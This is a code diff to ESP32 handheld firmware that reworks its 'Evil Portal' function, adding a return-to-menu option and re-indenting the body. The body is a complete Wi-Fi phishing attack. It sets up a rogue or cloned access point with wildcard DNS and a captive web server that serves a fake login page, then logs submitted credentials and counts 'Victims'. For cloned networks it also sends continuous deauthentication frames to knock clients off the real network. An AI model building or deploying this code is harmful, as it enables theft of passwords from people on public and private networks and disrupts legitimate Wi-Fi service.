@@ -45,157 +45,160 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
     options = {
         {"Default", [=]()       { chooseHtml(false); }},
         {"Custom Html", [=]()   { chooseHtml(true); }},
+        {"Main Menu", [=]() { backToMenu(); }}
     };
     delay(200);
     loopOptions(options);
     while(checkNextPress()){ yield(); } // debounce
 
-    //  tssid="" means that are opening a virgin Evil Portal
-    if (tssid=="")  {
-      AP_name = keyboard("Free Wifi", 30, "Evil Portal SSID:");
-      }
-    else { // tssid != "" means that is was cloned and can deploy Deauth
-      //memcpy(ap_record.bssid, bssid, 6);
-      memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-      wsl_bypasser_send_raw_frame(&ap_record,channel);
-      AP_name = tssid;
-    }
-
-    bool defaultIP=true;
-    options = {
-        {"127.0.0.1",   [&]()   { defaultIP=true; }},
-        {"192.168.4.1", [&]()   { defaultIP=false; }},
-    };
-    delay(200);
-    loopOptions(options);
-
-    wifiConnected=true;
-    drawMainBorder();
-    displayRedStripe("Starting..",TFT_WHITE,FGCOLOR);
-    WiFi.mode(WIFI_MODE_AP);
-    if(defaultIP) {
-      IPAddress AP_GATEWAY(172, 0, 0, 1);
-      WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
-      WiFi.softAP(AP_name,emptyString,channel);
-    } else {
-      IPAddress AP_GATEWAY(192, 168, 4, 1);
-      WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
-      WiFi.softAP(AP_name,emptyString,channel);
-    }
-
-    tmp=millis();
-    while(millis() - tmp < 3000) yield();
-
-  #ifdef STICK_C_PLUS2
-    ep=(WebServer*)ps_malloc(sizeof(WebServer));
-  #else
-    ep=(WebServer*)malloc(sizeof(WebServer));
-  #endif
-    new (ep) WebServer(80);
-
-    ep->on("/", [](){
-      ep->send(200, "text/html", html_file);
-    });
-    ep->on("/post", handleCreds);
-
-    ep->onNotFound([](){
-      if (ep->args()>0) {
-        handleCreds();
-      } else {
-        ep->send(200, "text/html", html_file);
-      }
-    });
-
-    ep->on("/creds", []() {
-      ep->send(200, "text/html", creds_GET());
-    });
-
-    ep->on("/ssid", []() {
-      ep->send(200, "text/html", ssid_GET());
-    });
-
-    ep->on("/postssid", [](){
-      if(ep->hasArg("ssid")) AP_name = ep->arg("ssid").c_str();
-      ep->send(200, "text/html", ssid_POST());
-      ep->stop();                            // pára o servidor
-      wifiDisconnect();                     // desliga o WiFi
-      WiFi.softAP(AP_name);                 // reinicia WiFi com novo SSID
-      ep->begin();                          // reinicia o servidor
-      previousTotalCapturedCredentials=-1;  // redesenha a tela
-    });
-
-    dnsServer.start(53, "*", WiFi.softAPIP());
-    ep->begin();
-
-    bool hold_deauth = false;
-    tmp=millis(); // one deauth frame each 30ms at least
-    redraw=true;
-    while(1) {
-      if(redraw) {
-        drawMainBorder();
-
-        tft.setTextSize(FM);
-        tft.setTextColor(TFT_RED);
-        tft.drawCentreString("Evil Portal",tft.width()/2, 29, SMOOTH_FONT);
-        tft.setCursor(8,46);
-        tft.setTextColor(FGCOLOR);
-        tft.println("AP: " + AP_name);
-        tft.setCursor(8,tft.getCursorY());
-        tft.println("->" + WiFi.softAPIP().toString() + "/creds");
-        tft.setCursor(8,tft.getCursorY());
-        tft.println("->" + WiFi.softAPIP().toString() + "/ssid");
-        tft.setCursor(8,tft.getCursorY());
-        tft.print("Victims: ");
-        tft.setTextColor(TFT_RED);
-        tft.println(String(totalCapturedCredentials));
-        tft.setCursor(8,tft.getCursorY());
-        tft.setTextSize(FP);
-        tft.println(last_cred.substring(0,last_cred.indexOf('\n')));
-        tft.setCursor(8,tft.getCursorY());
-        tft.println(last_cred.substring(last_cred.indexOf('\n')+1));
-
-        if (deauth){
-          if (hold_deauth) {
-            tft.setTextSize(FP);
-            tft.setTextColor(FGCOLOR);
-            tft.drawRightString("Deauth OFF", tft.width()-6,tft.height()-8,SMOOTH_FONT);
-          } else {
-            tft.setTextSize(FP);
-            tft.setTextColor(TFT_RED);
-            tft.drawRightString("Deauth ON", tft.width()-6,tft.height()-8,SMOOTH_FONT);
+    if(!returnToMenu) {
+        //  tssid="" means that are opening a virgin Evil Portal
+        if (tssid=="")  {
+          AP_name = keyboard("Free Wifi", 30, "Evil Portal SSID:");
           }
+        else { // tssid != "" means that is was cloned and can deploy Deauth
+          //memcpy(ap_record.bssid, bssid, 6);
+          memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+          wsl_bypasser_send_raw_frame(&ap_record,channel);
+          AP_name = tssid;
         }
 
-        redraw=false;
-      }
+        bool defaultIP=true;
+        options = {
+            {"127.0.0.1",   [&]()   { defaultIP=true; }},
+            {"192.168.4.1", [&]()   { defaultIP=false; }},
+        };
+        delay(200);
+        loopOptions(options);
 
-      if(!hold_deauth && (millis()-tmp) >5  && deauth)  {
-        wsl_bypasser_send_raw_frame(deauth_frame, 26); // sends deauth frames if needed.
+        wifiConnected=true;
+        drawMainBorder();
+        displayRedStripe("Starting..",TFT_WHITE,FGCOLOR);
+        WiFi.mode(WIFI_MODE_AP);
+        if(defaultIP) {
+          IPAddress AP_GATEWAY(172, 0, 0, 1);
+          WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
+          WiFi.softAP(AP_name,emptyString,channel);
+        } else {
+          IPAddress AP_GATEWAY(192, 168, 4, 1);
+          WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
+          WiFi.softAP(AP_name,emptyString,channel);
+        }
+
         tmp=millis();
-      }
+        while(millis() - tmp < 3000) yield();
 
-      if(checkSelPress()) {
-        while(checkSelPress()) { delay(80); } // timerless debounce
-        hold_deauth = !hold_deauth;
-        redraw=true;
-      }
-      if(totalCapturedCredentials!=(previousTotalCapturedCredentials+1)) {
-        redraw=true;
-        previousTotalCapturedCredentials = totalCapturedCredentials-1;
-      }
-      dnsServer.processNextRequest();
-      ep->handleClient();
+      #ifdef STICK_C_PLUS2
+        ep=(WebServer*)ps_malloc(sizeof(WebServer));
+      #else
+        ep=(WebServer*)malloc(sizeof(WebServer));
+      #endif
+        new (ep) WebServer(80);
 
-      if(checkEscPress()) break;
+        ep->on("/", [](){
+          ep->send(200, "text/html", html_file);
+        });
+        ep->on("/post", handleCreds);
+
+        ep->onNotFound([](){
+          if (ep->args()>0) {
+            handleCreds();
+          } else {
+            ep->send(200, "text/html", html_file);
+          }
+        });
+
+        ep->on("/creds", []() {
+          ep->send(200, "text/html", creds_GET());
+        });
+
+        ep->on("/ssid", []() {
+          ep->send(200, "text/html", ssid_GET());
+        });
+
+        ep->on("/postssid", [](){
+          if(ep->hasArg("ssid")) AP_name = ep->arg("ssid").c_str();
+          ep->send(200, "text/html", ssid_POST());
+          ep->stop();                            // pára o servidor
+          wifiDisconnect();                     // desliga o WiFi
+          WiFi.softAP(AP_name);                 // reinicia WiFi com novo SSID
+          ep->begin();                          // reinicia o servidor
+          previousTotalCapturedCredentials=-1;  // redesenha a tela
+        });
+
+        dnsServer.start(53, "*", WiFi.softAPIP());
+        ep->begin();
+
+        bool hold_deauth = false;
+        tmp=millis(); // one deauth frame each 30ms at least
+        redraw=true;
+        while(1) {
+          if(redraw) {
+            drawMainBorder();
+
+            tft.setTextSize(FM);
+            tft.setTextColor(TFT_RED);
+            tft.drawCentreString("Evil Portal",tft.width()/2, 29, SMOOTH_FONT);
+            tft.setCursor(8,46);
+            tft.setTextColor(FGCOLOR);
+            tft.println("AP: " + AP_name);
+            tft.setCursor(8,tft.getCursorY());
+            tft.println("->" + WiFi.softAPIP().toString() + "/creds");
+            tft.setCursor(8,tft.getCursorY());
+            tft.println("->" + WiFi.softAPIP().toString() + "/ssid");
+            tft.setCursor(8,tft.getCursorY());
+            tft.print("Victims: ");
+            tft.setTextColor(TFT_RED);
+            tft.println(String(totalCapturedCredentials));
+            tft.setCursor(8,tft.getCursorY());
+            tft.setTextSize(FP);
+            tft.println(last_cred.substring(0,last_cred.indexOf('\n')));
+            tft.setCursor(8,tft.getCursorY());
+            tft.println(last_cred.substring(last_cred.indexOf('\n')+1));
+
+            if (deauth){
+              if (hold_deauth) {
+                tft.setTextSize(FP);
+                tft.setTextColor(FGCOLOR);
+                tft.drawRightString("Deauth OFF", tft.width()-6,tft.height()-8,SMOOTH_FONT);
+              } else {
+                tft.setTextSize(FP);
+                tft.setTextColor(TFT_RED);
+                tft.drawRightString("Deauth ON", tft.width()-6,tft.height()-8,SMOOTH_FONT);
+              }
+            }
+
+            redraw=false;
+          }
+
+          if(!hold_deauth && (millis()-tmp) >5  && deauth)  {
+            wsl_bypasser_send_raw_frame(deauth_frame, 26); // sends deauth frames if needed.
+            tmp=millis();
+          }
+
+          if(checkSelPress()) {
+            while(checkSelPress()) { delay(80); } // timerless debounce
+            hold_deauth = !hold_deauth;
+            redraw=true;
+          }
+          if(totalCapturedCredentials!=(previousTotalCapturedCredentials+1)) {
+            redraw=true;
+            previousTotalCapturedCredentials = totalCapturedCredentials-1;
+          }
+          dnsServer.processNextRequest();
+          ep->handleClient();
+
+          if(checkEscPress()) break;
+        }
+        ep->close();
+        ep->~WebServer();
+        free(ep);
+        ep=nullptr;
+        dnsServer.stop();
+
+        delay(100);
+        wifiDisconnect();
     }
-    ep->close();
-    ep->~WebServer();
-    free(ep);
-    ep=nullptr;
-    dnsServer.stop();
-
-    delay(100);
-    wifiDisconnect();
 }
 
 // Função para salvar dados no arquivo CSV
